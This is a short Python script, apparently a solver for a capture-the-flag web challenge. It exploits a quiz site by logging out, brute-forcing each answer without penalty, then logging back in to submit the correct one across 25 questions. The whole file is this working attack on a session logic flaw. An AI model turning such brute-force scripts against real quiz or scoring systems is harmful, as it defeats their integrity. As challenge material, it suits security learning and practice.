import requests

url = "http://quiz-web.challs.csc.tf/"

s = requests.Session()

s.post(url + "register.php", data={"username": "a", "password": "a"})
s.post(url + "login.php", data={"username": "a", "password": "a"})
s.get(url + "quiz.php?topic=CTF")

for i in range(25):
    s.get(url + "logout.php")
    for j in range(5):
        if s.post(url + "quiz.php", data={"answer": str(j)}).text[-2] == "3":
            print(f"Found {j} at {i}")
            s.post(url + "login.php", data={"username": "a", "password": "a"})
            response = s.post(url + "quiz.php", data={"answer": str(j)}).text
            if i == 24:
                print(response)
            break
